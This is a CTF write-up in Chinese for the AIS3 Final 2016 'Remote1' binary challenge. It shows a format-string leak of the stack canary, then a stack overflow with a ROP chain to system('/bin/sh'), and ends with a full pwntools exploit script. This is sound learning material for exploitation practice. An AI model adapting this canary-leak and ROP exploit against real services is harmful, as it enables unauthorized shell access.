Title: [AIS3 FINAl 2016] Remote1
Date: 2016-08-28 20:33
Tags: AIS3, CTF, pwn, Format String, GOT Hijacking
Author: Naetw
Summary: A write-up for AIS3 FINAL 2016 Remote1

## Description

> 人生第一次比賽解題，來記錄一下
> 
> 這題應該要更快解決的 Orz，一開始走向比較麻煩的方向，直到 **@Brainsp8210** First Blood <(\_ \_)>

## Exploit

拿到題目就先執行看看，看到了 echo service，直覺是想到 **Format String**，於是送個 `%lx %lx %lx %lx`，確認是 **Format String**，但是一開始想直接去做 **GOT Hijack**，但是最後一個 byte 一直失敗QQ，不夠熟悉，該多練練，後來看到同學 First Blood，於是轉戰別的方向。

```bash
$ objdump -d pwn1 |less
```

看到了 `0000000000400620 <__stack_chk_fail@plt>:` 應該是可以對他進行 **Stack Overflow** 於是送了一坨 AAAAA 給他，`quit` 後跳出

```bash
*** stack smashing detected ***: ./pwn1 terminated
[1]    1249 segmentation fault  ./pwn1
```

因為 **Stack Canary** 會被放在 stack 上，於是利用 **Format String** 洩漏 stack 上的值，先送一段 payload

**Payload:**

`AAAAAAAA %lx %lx %lx %lx %lx %lx %lx %lx`

**Output:**

`AAAAAAAA 40095f 0 71 7f0cb954e700 1e 23 29b9356620 4141414141414141`

確認了如果要 dump 出 Buffer 的第一格需要 `%8$lx`，用 [Qira](https://github.com/BinaryAnalysisPlatform/qira) 或是 gdb 追一下程式，加上 `objdump`

```
40083e:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
400842:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
400849:       00 00
40084b:       74 05                   je     400852 <echo+0xb0>
40084d:       e8 ce fd ff ff          call   400620 <__stack_chk_fail@plt>
```

**Stack Frame:**

```
(gdb) x/gx $rbp
0x7fffffffea00: 0x00007fffffffea10

0x7fffffffe9e0: 0x4141414141414141
0x7fffffffe9e8: 0x00007ffff7a9000a
0x7fffffffe9f0: 0x0000000000000000
0x7fffffffe9f8: 0x0a2281f1d38aaf00
0x7fffffffea00: 0x00007fffffffea10
0x7fffffffea08: 0x000000000040088a
0x7fffffffea10: 0x00000000004008a0
0x7fffffffea18: 0x00007ffff7a58730
```

透過 **Stack Frame** 我們知道 **Stack Canary** 可用 `%11$lx` dump 出來，找到 **Canary** 的值後，等等 **Overflow** 就可以蓋上同樣的值，在結束 **echo** 時就不會呼叫 `__stack_chk_fail`，繞過 **Stack Guard**！！

在 `ret` 時 `rsp` 所在的位置覆蓋成 `pop rdi ; ret` 的 gadget，gadget 可利用 `ROPgadget` 去找，讓 `rdi` 的值為指向 `/bin/sh` 的字串位置，接著 `call system`，即可開啟 `Shell`

## Final Exploit:

```python
#!/usr/bin/env python

from pwn import *

# local
r = remote('127.0.0.1', 4000)
# remote
#r = remote('final.ais3.org', 32164)

system = 0x400630

pop_rdi_ret = 0x400903

sh = 0x400928

r.sendline('%11$lx') # leak stack canary
r.recvline()
r.recvline()

x = r.recvline()
y = x[x.find('prompt>'):]

canary = '0x' + y[8:]
canary = int(canary, 16)

r.sendline('a'*24 + p64(canary) + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(sh) + p64(system))

sleep(0.1)

r.sendline('quit')

r.interactive()
```
